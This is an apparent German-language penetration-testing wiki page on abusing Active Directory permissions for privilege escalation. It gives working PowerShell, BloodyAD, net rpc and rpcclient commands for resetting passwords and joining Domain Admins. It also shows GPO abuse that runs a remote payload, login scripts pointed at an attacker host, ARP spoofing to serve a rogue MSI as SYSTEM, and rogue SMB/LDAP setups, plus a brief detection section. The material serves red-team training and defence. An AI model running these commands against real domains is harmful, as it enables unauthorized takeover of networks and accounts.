# Missbrauch von Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Diese Seite ist größtenteils eine Zusammenfassung der Techniken aus** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **und** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Weitere Details findest du in den Originalartikeln.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll-Rechte für einen Benutzer**

Dieses Privileg gewährt einem Angreifer die vollständige Kontrolle über ein Zielbenutzerkonto. Sobald die `GenericAll`-Rechte mit dem Befehl `Get-ObjectAcl` bestätigt wurden, kann ein Angreifer:

- **Das Passwort des Ziels ändern**: Mit `net user <username> <password> /domain` kann der Angreifer das Passwort des Benutzers zurücksetzen.
- Unter Linux kannst du dasselbe über SAMR mit Samba `net rpc` tun:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Wenn das Konto deaktiviert ist, das UAC-Flag entfernen**: `GenericAll` ermöglicht das Bearbeiten von `userAccountControl`. Von Linux aus kann BloodyAD das `ACCOUNTDISABLE`-Flag entfernen:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Weise dem Benutzerkonto einen SPN zu, damit es kerberoastable wird, und verwende anschließend Rubeus und targetedKerberoast.py, um die Hashes des Ticket-Granting-Tickets (TGT) zu extrahieren und zu versuchen, sie zu cracken.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Gezieltes ASREPRoasting**: Deaktiviere die Pre-Authentication für den Benutzer, wodurch sein Konto für ASREPRoasting anfällig wird.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Mit `GenericAll` für einen Benutzer können Sie eine zertifikatbasierte Anmeldeinformation hinzufügen und sich als dieser Benutzer authentifizieren, ohne dessen Passwort zu ändern. Siehe:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll-Rechte für eine Gruppe**

Dieses Privileg ermöglicht es einem Angreifer, Gruppenmitgliedschaften zu manipulieren, wenn er über `GenericAll`-Rechte für eine Gruppe wie `Domain Admins` verfügt. Nachdem der Distinguished Name der Gruppe mit `Get-NetGroup` ermittelt wurde, kann der Angreifer:

- **Sich selbst zur Domain-Admins-Gruppe hinzufügen**: Dies kann über direkte Befehle oder mithilfe von Modulen wie Active Directory oder PowerSploit erfolgen.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Von Linux aus kannst du außerdem BloodyAD verwenden, um dich selbst in beliebige Gruppen aufzunehmen, wenn du GenericAll/Write-Berechtigungen für diese besitzt. Wenn die Zielgruppe in „Remote Management Users“ verschachtelt ist, erhältst du auf Hosts, die diese Gruppe berücksichtigen, sofort WinRM-Zugriff:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write für Computer/Benutzer**

Diese Berechtigungen für ein Computerobjekt oder ein Benutzerkonto ermöglichen:

- **Kerberos Resource-based Constrained Delegation**: Ermöglicht die Übernahme eines Computerobjekts.
- **Shadow Credentials**: Mit dieser Technik kann ein Computer- oder Benutzerkonto durch Ausnutzung der Berechtigungen zum Erstellen von Shadow Credentials imitiert werden.

## **WriteProperty für eine Gruppe**

Wenn ein Benutzer `WriteProperty`-Berechtigungen für alle Objekte einer bestimmten Gruppe (z. B. `Domain Admins`) besitzt, kann er:

- **Sich selbst zur Domain-Admins-Gruppe hinzufügen**: Durch die Kombination der Befehle `net user` und `Add-NetGroupUser` kann diese Methode zur Rechteausweitung innerhalb der Domäne verwendet werden.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Diese Berechtigung ermöglicht es Angreifern, sich über Befehle, die die Gruppenmitgliedschaft direkt manipulieren, zu bestimmten Gruppen wie `Domain Admins` hinzuzufügen. Die folgende Befehlssequenz ermöglicht das Hinzufügen der eigenen Identität:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Ein ähnliches Privileg ermöglicht es Angreifern, sich direkt zu Gruppen hinzuzufügen, indem sie Gruppeneigenschaften ändern, wenn sie das Recht `WriteProperty` für diese Gruppen besitzen. Die Bestätigung und Ausführung dieses Privilegs erfolgen mit:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Das Halten von `ExtendedRight` für einen Benutzer bei `User-Force-Change-Password` ermöglicht das Zurücksetzen von Passwörtern, ohne das aktuelle Passwort zu kennen. Die Überprüfung dieses Rechts und seine Ausnutzung können über PowerShell oder alternative Kommandozeilentools erfolgen. Dabei stehen mehrere Methoden zum Zurücksetzen des Passworts eines Benutzers zur Verfügung, einschließlich interaktiver Sitzungen und One-Linern für nicht interaktive Umgebungen. Die Befehle reichen von einfachen PowerShell-Aufrufen bis zur Verwendung von `rpcclient` unter Linux und veranschaulichen die Vielseitigkeit der Angriffsvektoren.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner für eine Gruppe**

Wenn ein Angreifer feststellt, dass er über `WriteOwner`-Berechtigungen für eine Gruppe verfügt, kann er den Besitzer der Gruppe auf sich selbst ändern. Dies ist besonders kritisch, wenn es sich bei der betreffenden Gruppe um `Domain Admins` handelt, da die Änderung des Besitzers eine umfassendere Kontrolle über Gruppenattribute und -mitgliedschaften ermöglicht. Der Prozess umfasst die Identifizierung des richtigen Objekts mit `Get-ObjectAcl` und anschließend die Verwendung von `Set-DomainObjectOwner`, um den Besitzer entweder anhand der SID oder des Namens zu ändern.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Diese Berechtigung ermöglicht es einem Angreifer, Benutzereigenschaften zu ändern. Mit `GenericWrite`-Zugriff kann der Angreifer insbesondere den Pfad des Anmeldeskripts eines Benutzers ändern, um bei der Benutzeranmeldung ein schädliches Skript auszuführen. Dies wird erreicht, indem der Befehl `Set-ADObject` verwendet wird, um die Eigenschaft `scriptpath` des Zielbenutzers so zu aktualisieren, dass sie auf das Skript des Angreifers verweist.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Mit diesem Privileg können Angreifer die Gruppenmitgliedschaft manipulieren, beispielsweise indem sie sich selbst oder andere Benutzer zu bestimmten Gruppen hinzufügen. Dieser Prozess umfasst das Erstellen eines Credential-Objekts, dessen Verwendung zum Hinzufügen oder Entfernen von Benutzern aus einer Gruppe sowie die Überprüfung der Änderungen an der Mitgliedschaft mit PowerShell-Befehlen.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Von Linux aus kann Samba `net` Mitglieder hinzufügen/entfernen, wenn du `GenericWrite` für die Gruppe besitzt (nützlich, wenn PowerShell/RSAT nicht verfügbar sind):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Der Besitz eines AD-Objekts und `WriteDACL`-Berechtigungen dafür ermöglichen es einem Angreifer, sich selbst `GenericAll`-Berechtigungen für das Objekt zu gewähren. Dies wird durch ADSI-Manipulation erreicht und ermöglicht die vollständige Kontrolle über das Objekt sowie die Änderung seiner Gruppenmitgliedschaften. Dennoch bestehen Einschränkungen beim Versuch, diese Berechtigungen mithilfe der Cmdlets `Set-Acl` / `Get-Acl` des Active Directory-Moduls auszunutzen.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Schnelle Übernahme mit WriteDACL/WriteOwner (PowerView)

Wenn Sie `WriteOwner` und `WriteDacl` für ein Benutzer- oder Dienstkonto besitzen, können Sie mit PowerView die vollständige Kontrolle übernehmen und dessen Passwort zurücksetzen, ohne das alte Passwort zu kennen:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Hinweis:
- Möglicherweise musst du zuerst den Besitzer auf dich selbst ändern, wenn du nur `WriteOwner` hast:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validieren Sie den Zugriff mit einem beliebigen Protokoll (SMB/LDAP/RDP/WinRM) nach dem Zurücksetzen des Passworts.

## **Replikation in der Domäne (DCSync)**

Der DCSync-Angriff nutzt bestimmte Replikationsberechtigungen in der Domäne, um einen Domain Controller zu imitieren und Daten, einschließlich Benutzeranmeldedaten, zu synchronisieren. Diese leistungsfähige Technik erfordert Berechtigungen wie `DS-Replication-Get-Changes`, die es Angreifern ermöglichen, vertrauliche Informationen aus der AD-Umgebung zu extrahieren, ohne direkten Zugriff auf einen Domain Controller zu benötigen.<sup>[[5]](#references)</sup> [**Erfahren Sie hier mehr über den DCSync-Angriff.**](../dcsync.md)

## GPO-Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO-Delegation

Delegierter Zugriff zur Verwaltung von Group Policy Objects (GPOs) kann erhebliche Sicherheitsrisiken darstellen. Wenn beispielsweise einem Benutzer wie `offense\spotless` Rechte zur GPO-Verwaltung delegiert wurden, kann dieser über Berechtigungen wie **WriteProperty**, **WriteDacl** und **WriteOwner** verfügen. Diese Berechtigungen können für böswillige Zwecke missbraucht werden, wie mithilfe von PowerView festgestellt werden kann: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO-Berechtigungen aufzählen

Um falsch konfigurierte GPOs zu identifizieren, können die Cmdlets von PowerSploit miteinander verkettet werden. Dadurch lassen sich GPOs ermitteln, die ein bestimmter Benutzer verwalten darf: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computer, auf die eine bestimmte Richtlinie angewendet wird**: Es ist möglich zu ermitteln, auf welche Computer eine bestimmte GPO angewendet wird, um den Umfang potenzieller Auswirkungen besser zu verstehen. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Auf einen bestimmten Computer angewendete Richtlinien**: Um zu sehen, welche Richtlinien auf einen bestimmten Computer angewendet werden, können Befehle wie `Get-DomainGPO` verwendet werden.

**OUs, auf die eine bestimmte Richtlinie angewendet wird**: Die von einer bestimmten Richtlinie betroffenen Organisationseinheiten (OUs) können mit `Get-DomainOU` identifiziert werden.

Sie können auch das Tool [**GPOHound**](https://github.com/cogiceo/GPOHound) verwenden, um GPOs aufzuzählen und darin enthaltene Probleme zu finden.

### GPO missbrauchen – New-GPOImmediateTask

Fehlerhaft konfigurierte GPOs können ausgenutzt werden, um Code auszuführen, beispielsweise durch das Erstellen einer sofort ausgeführten geplanten Aufgabe. Dadurch kann ein Benutzer der lokalen Administratorengruppe auf den betroffenen Computern hinzugefügt werden, wodurch die Berechtigungen erheblich erweitert werden:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Das GroupPolicy module ermöglicht, sofern es installiert ist, die Erstellung und Verknüpfung neuer GPOs sowie das Festlegen von Einstellungen wie Registry-Werten, um Backdoors auf betroffenen Computern auszuführen. Für diese Methode muss die GPO aktualisiert werden und sich ein Benutzer am Computer anmelden, damit die Ausführung erfolgt:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO missbrauchen

SharpGPOAbuse bietet eine Methode, um vorhandene GPOs zu missbrauchen, indem Tasks hinzugefügt oder Einstellungen geändert werden, ohne neue GPOs erstellen zu müssen. Dieses Tool erfordert die Änderung vorhandener GPOs oder die Verwendung von RSAT-Tools, um vor der Anwendung der Änderungen neue GPOs zu erstellen:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Richtlinienaktualisierung erzwingen

GPO-Aktualisierungen erfolgen typischerweise etwa alle 90 Minuten. Um diesen Vorgang zu beschleunigen, insbesondere nach der Implementierung einer Änderung, kann auf dem Zielcomputer der Befehl `gpupdate /force` verwendet werden, um eine sofortige Richtlinienaktualisierung zu erzwingen. Dieser Befehl stellt sicher, dass Änderungen an GPOs angewendet werden, ohne auf den nächsten automatischen Aktualisierungszyklus zu warten.

### Unter der Haube

Bei der Untersuchung der Scheduled Tasks für ein bestimmtes GPO, etwa die `Misconfigured Policy`, kann das Hinzufügen von Tasks wie `evilTask` bestätigt werden. Diese Tasks werden durch Scripts oder Kommandozeilen-Tools erstellt, die das Systemverhalten ändern oder Privilegien eskalieren sollen.

Die Struktur des Tasks, wie sie in der von `New-GPOImmediateTask` erzeugten XML-Konfigurationsdatei dargestellt wird, beschreibt die Details des Scheduled Tasks - einschließlich des auszuführenden Befehls und seiner Trigger. Diese Datei zeigt, wie Scheduled Tasks innerhalb von GPOs definiert und verwaltet werden, und bietet eine Möglichkeit, beliebige Befehle oder Scripts im Rahmen der Richtlinienanwendung auszuführen.

### Benutzer und Gruppen

GPOs ermöglichen außerdem die Manipulation von Benutzer- und Gruppenmitgliedschaften auf Zielsystemen. Durch das direkte Bearbeiten der Richtliniendateien für Benutzer und Gruppen können Angreifer Benutzer privilegierten Gruppen hinzufügen, etwa der lokalen `administrators`-Gruppe. Dies ist durch die Delegation von GPO-Verwaltungsberechtigungen möglich, wodurch Richtliniendateien geändert werden können, um neue Benutzer aufzunehmen oder Gruppenmitgliedschaften zu ändern.

Die XML-Konfigurationsdatei für Benutzer und Gruppen beschreibt, wie diese Änderungen umgesetzt werden. Durch das Hinzufügen von Einträgen zu dieser Datei können bestimmten Benutzern auf den betroffenen Systemen erweiterte Berechtigungen gewährt werden. Diese Methode bietet einen direkten Ansatz zur Privilege Escalation durch GPO-Manipulation.

Darüber hinaus können weitere Methoden zur Codeausführung oder zur Aufrechterhaltung der Persistence in Betracht gezogen werden, etwa die Nutzung von Logon-/Logoff-Scripts, die Änderung von Registry-Schlüsseln für Autoruns, die Installation von Software über `.msi`-Dateien oder die Bearbeitung von Service-Konfigurationen. Diese Techniken bieten verschiedene Möglichkeiten, durch den Missbrauch von GPOs den Zugriff aufrechtzuerhalten und Zielsysteme zu kontrollieren.

### GPC/GPT-Abruf an authentifizierte Rogue Services umleiten

Ein GPO besteht aus einem LDAP-**Group Policy Container (GPC)** mit Metadaten und einem über SMB gehosteten **Group Policy Template (GPT)** mit den Richtliniendateien. Während der Aktualisierung folgt der Client dem `gPLink` des Containers, liest den referenzierten GPC und dessen `gPCFileSysPath` und lädt anschließend das GPT von diesem UNC-Pfad herunter. Folglich kann Schreibzugriff entweder auf den GPC selbst oder auf den `gPLink` einer OU, Site oder Domain in die Verarbeitung privilegierter Richtlinien umgewandelt werden.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Vergiftung von `gPCFileSysPath` mit GPOddity

Wenn der kontrollierte Principal den Ziel-GPC beschreiben kann (direkt oder über **NTLM relay to LDAP**), wird `gPCFileSysPath` durch einen vom Angreifer gehosteten UNC-Pfad ersetzt. [GPOddity](https://github.com/synacktiv/GPOddity) automatisiert die LDAP-Änderung und stellt ein schädliches GPT bereit, das modulbasierte Richtliniendateien oder einen Immediate Task enthält, den der Group Policy Client als `NT AUTHORITY\SYSTEM` ausführt.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Ein anonymes oder nicht anmeldeinformationsgebundenes SMB-Share ist auf aktuellen Windows-Clients nicht ausreichend: SMB Secure Negotiate erfordert einen Nachweis, dass die Authentifizierung erfolgreich war. Daher muss der Rogue Service die Domain-Identität validieren, den SMB-Session-Key ableiten und seine Antworten korrekt signieren. Im Embedded-Modus wird GPOddity mit einem kontrollierten Machine Account und dessen Service-Key konfiguriert. Anschließend wird im Abschnitt `[COMMANDS]` ein Computer- oder Benutzerseitiger Payload ausgewählt.<sup>[[15]](#references)[[16]](#references)</sup>
```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```
**User-GPO-Sonderfall:** Nach MS16-072 erstellt Windows weiterhin zwei SMB2-Sitzungen in derselben **TCP-Verbindung**: Die Benutzer-Sitzung liest `GPT.INI`, anschließend liest die Computerkonto-Sitzung effektive Konfigurationen wie `ScheduledTasks.xml`. Ein Rogue-Server muss daher Authentifizierungsstatus, Sitzungsschlüssel und Signaturschlüssel nach SMB2-`SessionId` und nicht nur nach Socket indizieren. Der in GPOddity/OUned eingebettete Scapy-Fork implementiert dies über `SMBStreamSocketMultiplexing` und einen Multiplexing-fähigen `SMBServer`; Single-Session-Impacket/Scapy-Server verwenden andernfalls den falschen Signaturstatus erneut und schlagen bei Benutzer-Policies fehl.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning mit OUned

Mit `WriteGPLink`, `GenericWrite` oder gleichwertiger Kontrolle über eine OU, Site oder Domain kann ein Angreifer einen Link anhängen, dessen GPC-DN von einem vom Angreifer kontrollierten LDAP-Host bereitgestellt wird. Dieses Primitive wurde ursprünglich von Petros Koutroumpis vorgestellt; [OUned](https://github.com/synacktiv/OUned) automatisiert den LDAP-Schreibvorgang und die bösartige GPC/GPT-Kette.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
Das Opfer authentifiziert sich zunächst beim Rogue-LDAP-Service und erhält ein GPC, dessen `gPCFileSysPath` auf den Rogue-SMB-Service verweist; anschließend authentifiziert es sich bei SMB und wendet das bereitgestellte GPT an. OUned benötigt daher ein Konto mit einem LDAP-SPN, ein Computerkonto mit einem HOST-SPN für SMB (dasselbe Computerkonto kann beide Anforderungen erfüllen) sowie eine DNS-Auflösung oder Reverse-Forwarding, die die Ports 389 und 445 an den Operator-Host weiterleitet.<sup>[[15]](#references)[[17]](#references)</sup>
```bash
python3 OUned.py --config config.ini -v
```
OUned's eingebetteter Scapy-LDAP-Server validiert Kerberos/SPNEGO mit dem echten Schlüssel des kontrollierten Service und stellt beliebige GPC-Daten aus JSON bereit. Der leere JSON-Schlüssel bildet rootDSE ab, `base64:`-Präfixe repräsentieren Binärwerte, und der Server unterstützt add/delete/modify/search sowie `BASE`-, `LEVEL`- und `SUBTREE`-Suchen; er kann keine, Integritäts- oder Vertraulichkeitsschutz aushandeln. Dadurch ist der Service wiederverwendbar, wenn eine andere Windows-Komponente einer vom Angreifer kontrollierten LDAP-Referenz folgt, aber auf authentifiziertem LDAP besteht.<sup>[[15]](#references)</sup>

Gehen Sie nicht davon aus, dass das Synchronisieren eines Account-Passworts in eine Dummy-Domain jeden Kerberos-Schlüssel reproduziert: RC4 wird aus dem Passwort abgeleitet, während AES string-to-key zusätzlich einen Salt verwendet, der aus dem Hostnamen/der Domain des Principals abgeleitet wird. Das Übergeben des tatsächlichen AES-Schlüssels des Accounts an `KerberosSSP` vermeidet, RC4 durch eine erkennbare Änderung an `msDS-SupportedEncryptionTypes` des Computerkontos zu erzwingen, das dieses Attribut selbst schreiben darf.<sup>[[15]](#references)</sup>

#### Detection-Pivots

Korrelieren Sie Änderungen an `gPCFileSysPath` oder `gPLink` mit GPO-Versionsänderungen und neuen Immediate/Scheduled-Task-XML-Dateien. Untersuchen Sie Verknüpfungen zu unerwarteten Naming Contexts, UNC-Hosts außerhalb der genehmigten DC/SYSVOL-Menge, DNS-Einträge, die Computerkontonamen umleiten, LDAP/CIFS-Service-Tickets für ungewöhnliche Computerkonten sowie Änderungen an `msDS-SupportedEncryptionTypes`, die RC4 aktivieren.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` über eine OU/Domain ermöglicht Ihnen, das `gPLink`-Attribut des Ziel-Containers zu ändern und **das Anwenden eines vorhandenen GPO zu erzwingen**, ohne das GPO selbst zu bearbeiten. Dies wird interessant, wenn das verknüpfte GPO bereits auf entfernte Inhalte über **UNC paths** (`\\HOST\share\...`) verweist, da authentifizierte Benutzer **SYSVOL** lesen und offline nach wiederverwendbaren Policies suchen können.<sup>[[11]](#references)</sup>

Workflow auf hoher Ebene:

1. Verwenden Sie BloodHound, um einen Principal mit `WriteGPLink` über einer OU zu identifizieren, und ermitteln Sie die Computer/Benutzer innerhalb dieser OU.
2. Klonen Sie `SYSVOL` schreibgeschützt und analysieren Sie die GPOs auf **Software Installation**, **drive mappings** (`Drives.xml`) sowie **logon/startup scripts**, die auf UNC paths verweisen.
3. Bevorzugen Sie Policies, die auf einen **direkten Hostnamen** verweisen (zum Beispiel `\\DC02\share\pkg.msi`) statt auf DFS-/Domain-Namespace-Pfade, da hostname-basierte Pfade sich durch L2-Spoofing leichter umleiten lassen.
4. Fügen Sie die GUID des ausgewählten GPO zur `gPLink` der Ziel-OU hinzu, damit das Opfer diese bereits vorhandene Policy verarbeitet.
5. Führen Sie in derselben Broadcast-Domain ARP-Spoofing für den UNC-Host durch und binden Sie seine IP lokal (`ip addr add <target_ip>/32 dev <iface>`), sodass der SMB-Datenverkehr des Opfers Ihren Host erreicht.
6. Stellen Sie den erwarteten Pfad/die erwartete Datei über einen angreiferkontrollierten SMB-Server (zum Beispiel `smbserver.py`) bereit und warten Sie auf die normale Policy-Verarbeitung.

Beispiel für die Sammlung von `SYSVOL` und die Korrelation von GPOs:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Die bestehende GPO mit der Ziel-OU verknüpfen:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Wenn die verknüpfte GPO ein MSI von einem UNC-Pfad bereitstellt, ruft der Client es beim **Computerstart** ab und installiert es als **`NT AUTHORITY\SYSTEM`**. Indem du den referenzierten Host spoofst und ein bösartiges MSI unter demselben **Share/Pfad/Namen** bereitstellst, kannst du `WriteGPLink` in eine SYSTEM-Codeausführung verwandeln, **ohne SYSVOL zu verändern**.

Wichtige Einschränkungen:

- **Das Timing ist entscheidend**: Der neue Link wird bei der Richtlinienaktualisierung erkannt (üblicherweise nach etwa 90 Minuten), aber **Software Installation** wird normalerweise beim **Neustart** ausgelöst.
- Windows Installer verfolgt die Bereitstellung üblicherweise anhand des **`ProductCode`**. Wenn das Produkt bereits installiert ist, wird die Bereitstellung möglicherweise übersprungen.
- Um eine Ablehnung durch den Installer zu vermeiden, muss das Rogue-MSI so gepatcht werden, dass sein **`ProductCode`** und **`PackageCode`** mit denen des von der GPO erwarteten legitimen Pakets übereinstimmen.
- Alte `.aas`-Advertisement-Dateien können in `SYSVOL` verbleiben. Überprüfe daher, ob die Bereitstellung weiterhin aktiv aussieht, bevor du dich darauf verlässt.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP-Laufwerkszuordnungen in `Drives.xml` führen dazu, dass sich Benutzer während der Anmeldung oder beim erneuten Verbinden am konfigurierten UNC-Pfad authentifizieren. Wenn du den referenzierten Host spoofst, kannst du **NetNTLMv2** abfangen. Wenn SMB absichtlich zum Fehlschlagen gebracht wird, versucht Windows möglicherweise erneut, die Verbindung über **WebDAV** herzustellen, und sendet **NTLM über HTTP**, was Relays zu **LDAP(S)**, **AD CS** oder **SMB** deutlich flexibler macht.

#### Logon/startup script UNC hijack

Dasselbe Muster gilt für UNC-gehostete Skripte, die in `SYSVOL` gefunden werden:

- **Logon scripts** werden normalerweise im Kontext des **Benutzers** ausgeführt.
- **Startup scripts** werden normalerweise im Kontext des **Computers / SYSTEM** ausgeführt.

Wenn der Skriptpfad auf einen spoofbaren Hostnamen verweist, leite den UNC-Host um und stelle Ersatz-Skriptinhalte vom erwarteten Speicherort bereit.

## SYSVOL/NETLOGON Logon Script Poisoning

Beschreibbare Pfade unter `\\<dc>\SYSVOL\<domain>\scripts\` oder `\\<dc>\NETLOGON\` ermöglichen die Manipulation von Logon-Skripten, die bei der Benutzeranmeldung über GPO ausgeführt werden. Dies ermöglicht Code Execution im Sicherheitskontext der Benutzer, die sich anmelden.

### Logon scripts lokalisieren
- Untersuche Benutzerattribute auf ein konfiguriertes Logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Durchsuche Domain-Freigaben, um Verknüpfungen oder Verweise auf Scripts aufzuspüren:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- `.lnk`-Dateien analysieren, um Ziele aufzulösen, die auf SYSVOL/NETLOGON verweisen (nützlicher DFIR-Trick und für Angreifer ohne direkten GPO-Zugriff):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound zeigt das Attribut `logonScript` (scriptPath) auf Benutzernodes an, wenn es vorhanden ist.

### Schreibzugriff validieren (Share-Auflistungen nicht vertrauen)
Automatisierte Tools können SYSVOL/NETLOGON als schreibgeschützt anzeigen, aber die zugrunde liegenden NTFS-ACLs können dennoch Schreibzugriffe erlauben. Immer testen:
```bash
# Interactive write test
